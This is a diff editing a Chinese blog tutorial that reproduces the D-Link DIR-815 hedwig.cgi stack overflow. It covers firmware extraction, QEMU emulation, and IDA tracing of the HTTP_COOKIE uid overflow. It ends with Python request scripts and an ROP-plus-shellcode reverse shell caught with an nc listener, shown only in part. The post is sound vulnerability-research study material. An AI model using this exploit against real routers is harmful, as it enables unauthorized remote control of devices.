@@ -1,17 +1,13 @@
 ---
 title: "DIR-815 栈溢出漏洞复现"
-description: "学习 IOT 的第一步，复现经典漏洞"
+description: "D-Link DIR-815 的 hedwig.cgi 栈溢出：固件分离、QEMU 仿真、定位漏洞，再到 ROP + shellcode 拿 shell。"
 pubDate: 2026-05-21
 category: iot
 tags: [iot]
 ---
 
-参考文献
-	- [IoT 安全从零到掌握：超详尽入门指南（实战篇）-先知社区](https://xz.aliyun.com/news/15948)
-	- [[原创] 从零开始复现 DIR-815 栈溢出漏洞-二进制漏洞-看雪安全社区｜专业技术交流与安全研究论坛](https://bbs.kanxue.com/thread-272318.htm)
-
 ## 固件分离
-由于是复现，网上直接下载[固件](https://rebyte.me/en/d-link/89510/file-592084/)，然后直接分离，先使用 binwalk 查看内容
+复现用[这个固件](https://rebyte.me/en/d-link/89510/file-592084/)。拿到之后先 `binwalk` 看看里面有什么：
 ```bash
 ➜  dir815_FW_101 binwalk ./DIR-815_FW_1.01b14.bin
 ---------------------------------------------------------------------------
@@ -39,27 +35,26 @@ Analyzed 1 file for 85 file signatures (187 magic patterns) in 131.0 millisecond
 - D-Link 固件头部
 - LZMA 压缩数据块
 - 根文件系统 rootfs
-> 提取文件系统前，须安装 sasquatch
 
-提取方法：
+提取前先装 `sasquatch`（binwalk 自带的不支持 squashfs 4.0 + lzma），然后：
 ```bash
 sudo binwalk -e ./DIR-815_FW_1.01b14.bin
 # 或者用 dd 命令
 dd if=DIR-815_FW_1.01b14.bin of=squashfs.sqsh bs=1 skip=$((0xF008C)) status=progress
 sudo sasquatch ./squashfs.sqsh 
 ```
-使用 sudo 是因为，文件系统可能有 /dev/ 之类的东西，
+用 `sudo` 是因为文件系统里有 `/dev` 这类设备节点，不 root 建不出来。
 
 ## 仿真运行
 ### 下载内核文件
 点击[下载地址](https://people.debian.org/~aurel32/qemu/mipsel/)
 
-下载 vmlinux-3.2.0-4-4kc-malta 和 vmlinux-2.6.32-5-4kc-malta 都可，固件中的内核是 2.6 的，但是笔者下载的是 3.2。
+`vmlinux-3.2.0-4-4kc-malta` 和 `vmlinux-2.6.32-5-4kc-malta` 都能用：固件里原本是 2.6 的内核，我用的是 3.2。
 
 ### 构建文件系统
-上一步中，已经获得了 ./squashfs.sqsh，也就是 SquashFS file system，为了适配内核，得转成 ext2
+上一步拿到的是 SquashFS 镜像，这个内核不认，得转成 ext2 再挂进 QEMU。
 
-64M 应该够了，不够就改大
+64M 够用，不够再改大。
 ```bash
 mkdir mnt
 dd if=/dev/zero of=rootfs.ext2 bs=1M count=64 
@@ -200,7 +195,7 @@ Server
 传入一个 静态编译的 gdbserver 到 mnt 目录下。
 下载链接：[Releases · guyush1/gdb-static](https://github.com/guyush1/gdb-static/releases)
 
-最后，解除挂载： `sudo umont mnt` 。
+最后，解除挂载： `sudo umount mnt` 。
 
 ### 运行
 创建 run.sh，内容如下
@@ -216,11 +211,10 @@ qemu-system-mipsel \
   -nographic
 ```
 
-转发了 80、1234 两个端口为本地的 6666 和 1234。
-前者用于访问 web 服务，后者用于远程调试，可以访问 `http://127.0.0.1:6666/hedwig.cgi` 看看效果。
+容器里的 80 和 1234 分别转发到宿主的 6666 和 1234：前者访问 web，后者留给 gdbserver。可以先访问 `http://127.0.0.1:6666/hedwig.cgi` 看看有没有响应。
 
 ## 漏洞程序分析
-`/htdocs/web/hedwig.cgi` ，但是是软链接到 `/htdocs/cgibin`
+`/htdocs/web/hedwig.cgi` 是个指向 `/htdocs/cgibin` 的软链接。
 
 ### hedwigcgi_main
 使用 ida 打开
@@ -233,7 +227,7 @@ if ( !strcmp(v3, "hedwig.cgi") )
 }
 ```
 
-查看 hedwigcgi_main，注意到
+看 `hedwigcgi_main`：
 ```C
 ...
 char v27[1024]; // [sp+C0h] [-400h] BYREF
@@ -243,7 +237,7 @@ sprintf(v27, "/htdocs/webinc/fatlady.php\nprefix=%s/%s", "/runtime/session", v20
 xmldbc_ephp(0, 0, v27, stdout);
 ...
 ```
-sprintf 存在溢出的可能，%s 并未限定长度，v27 数组大小才 1024，如果 v20 长度足够就能溢出，向上追溯 v20。
+`%s` 没有限定长度，而 `v27` 只有 1024 字节——`v20` 够长就能溢出。接下来往上追 `v20` 从哪来：
 
 ```C
 char *__fastcall sobj_get_string(int a1)
@@ -260,7 +254,7 @@ char *__fastcall sobj_get_string(int a1)
   return v1;
 }
 ```
-看起来 v20，只是 v4 指向结构体的指针字段，继续追溯 v4
+`v20` 其实是 `v4` 指向的结构体里的一个字段，继续追 `v4`：
 
 ```C
 v4 = sobj_new();
@@ -362,9 +356,9 @@ LABEL_22:
     sobj_del(val_obj);
 }
 ```
-总之，就是找 **HTTP_COOKIE** 环境变量中的形似于 _uid=xxxxxxxxxxxxx_ 的内容，然后把 = 后面的给到 `ptr`，也就是上文的 `v4` 。
+一句话：从 `HTTP_COOKIE` 里挑出 `uid=` 后面的值，写进 `ptr`（也就是上文的 `v4`）。
 
-容易想到利用 HTTP_COOKIE 进行栈溢出利用。
+于是溢出点就落在 `HTTP_COOKIE` 上。
 
 ## 漏洞复现
 
@@ -377,14 +371,14 @@ LABEL_22:
 然后在宿主机上使用 `gdb-multiarch ./hedwig.cgi` 调试，然后用 `target remote :1234` 连接远程。
 
 ### 漏洞利用
-经过分析，知道是 mips 栈溢出利用，为了成功运行到 sprintf，还需要一些额外的准备
+确认是 MIPS 栈溢出之后，还得先解决两个"跑不到 `sprintf`"的问题：
 ```C
 v20 = sobj_get_string(v4);
 sprintf(v27, "/htdocs/webinc/fatlady.php\nprefix=%s/%s", "/runtime/session", v20);
 xmldbc_ephp(0, 0, v27, stdout);
 ```
 
-#### 第一个注意点
+### 必须是 POST
 ```C
 ...
 	REQUEST_METHOD = getenv("REQUEST_METHOD");
@@ -416,10 +410,10 @@ LABEL_26:
 	return v9;
 }
 ```
-必须满足是 POST 请求方法
+所以请求必须是 POST。
 
-#### 第二个注意点
-注意到有对 haystack 变量的检测
+### 需要 XML 数据
+另外 `haystack` 不能为空：
 ```C
 if ( !haystack )
 {
@@ -430,7 +424,7 @@ if ( !haystack )
 
 这个变量可以通过 **cgibin_parse_request -> sub_403B10 -> sub_402FFC -> sub_402B40 -> sub_409A6C** 的路径赋值（实际上是 `hedwigcgi_main` 中，`cgibin_parse_request` 将 `sub_409A6C` 函数指针作为参数传递，最后在 `sub_402B40` 触发 `sub_409A6C`）
 
-简单修复 cgibin_parse_request，内容如下（省去了一部分）
+`cgibin_parse_request` 的关键部分如下（省略无关分支）：
 ```C
 int __fastcall cgibin_parse_request(void (*func)(), int num, unsigned int a3)
 {
@@ -498,7 +492,7 @@ int __fastcall cgibin_parse_request(void (*func)(), int num, unsigned int a3)
   return v9;
 }
 ```
-在 `(funcs[idx - 1].fun)(func, num, CONTENT_LENGTH, &CONTENT_TYPE[len])` 触发函数指针，对应的 path 是 **application/**
+函数指针在 `(funcs[idx - 1].fun)(func, num, CONTENT_LENGTH, &CONTENT_TYPE[len])` 处被调用，对应的 path 前缀是 `application/`。
 
 ```C
 int __fastcall sub_403B10(void (*func)(), int num, size_t len, const char *str) {
@@ -509,12 +503,10 @@ int __fastcall sub_403B10(void (*func)(), int num, size_t len, const char *str) 
 	return -1;
 }
 ```
-为了触发 `sub_402FFC(func, num, len)` ，需要 str 为 **x-www-form-urlencoded**，也就是上面的 `&CONTENT_TYPE[len]` 是**x-www-form-urlencoded** 。
-
-综上，*CONTENT_TYPE* （对应请求的 Content-Type 字段）为 **application/x-www-form-urlencoded**
+要走 `sub_402FFC`，`&CONTENT_TYPE[len]` 必须等于 `x-www-form-urlencoded`，合起来就是请求头 `Content-Type: application/x-www-form-urlencoded`。
 
 #### 尝试调试
-首先，连接上调试，加上断点，然后 `continue` 继续运行，最后使用 python 脚本发信
+先连上调试、下好断点，`continue` 之后用脚本发请求：
 ```python
 import requests
 from pwn import *
@@ -535,12 +527,12 @@ res = requests.post(url = url, data = data, headers = header)
 ```
 就能看到程序停在断点处。
 
-> 注意：payload 不要写 \x00 这样的内容，会阶段，\x09 好像也会被处理成 \x20。
+> 注意：payload 里不要出现 `\x00`，会被截断；`\x09` 也会被当成空格处理成 `\x20`。
 
 ### 反弹 shell
-上面提供的脚本刚好覆盖返回地址最低位为 0x66，修改为其他内容就能实现任意地址跳转。
+上面那个脚本刚好把返回地址的最低字节写成 `0x66`，换成别的值就能跳到任意地址。
 
-~~mips rop 就不细讲了，无非是 gadget 凑 ROP。~~
+MIPS 的 ROP 细节这里不展开，本质还是找 gadget 拼链。
 
 这里采用 ROP+shellcode 反弹 shell 的方法，记得另开一个终端监听 4444 端口：`nc -lvnp 4444`
 ```python
@@ -623,3 +615,8 @@ header = {
 res = requests.post(url = url, data = data, headers = header)
 print(res.text)
 ```
+
+## 参考文献
+
+- [IoT 安全从零到掌握：超详尽入门指南（实战篇）-先知社区](https://xz.aliyun.com/news/15948)
+- [[原创] 从零开始复现 DIR-815 栈溢出漏洞-二进制漏洞-看雪安全社区｜专业技术交流与安全研究论坛](https://bbs.kanxue.com/thread-272318.htm)
